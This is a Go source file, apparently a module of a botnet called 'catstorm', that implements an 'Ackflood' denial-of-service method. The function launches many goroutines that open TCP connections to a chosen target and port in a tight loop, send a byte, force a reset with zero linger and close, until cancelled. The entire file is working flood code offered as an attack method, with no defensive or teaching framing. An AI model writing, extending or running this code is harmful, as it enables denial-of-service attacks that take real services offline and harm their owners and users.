package l4

import (
	"context"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

func Ackflood(ctx context.Context, target, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	workers := methods.Workers()
	data := make([]byte, 1)

	for w := 0; w < workers; w++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				con, er := net.DialTimeout("tcp", addr, 3*time.Second)
				if er != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}
				con.Write(data)
				if tcp, ok := con.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				}
				con.Close()
			}
		}()
	}
	<-ctx.Done()
}
